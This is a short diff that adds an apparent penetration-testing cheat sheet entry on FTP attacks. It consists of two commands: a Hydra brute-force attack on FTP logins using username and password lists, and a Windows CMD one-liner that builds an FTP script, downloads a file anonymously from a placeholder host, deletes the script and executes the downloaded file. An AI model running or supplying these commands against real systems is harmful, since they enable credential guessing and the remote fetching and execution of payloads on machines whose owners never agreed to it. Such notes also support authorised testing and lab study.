@@ -1,0 +1,7 @@
+# Brute Force FTP User
+hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
+
+# Create a text file containing all FTP detail to download a file using Windows CMD prompt and execute it
+echo open <IP> 21 > ftp.txt & echo USER anonymous >> ftp.txt & echo anonymous >> ftp.txt & echo bin >> ftp.txt & echo GET <File> >> ftp.txt & echo bye >> ftp.txt & ftp -v -n -s:ftp.txt & del ftp.txt & <File>
+
+
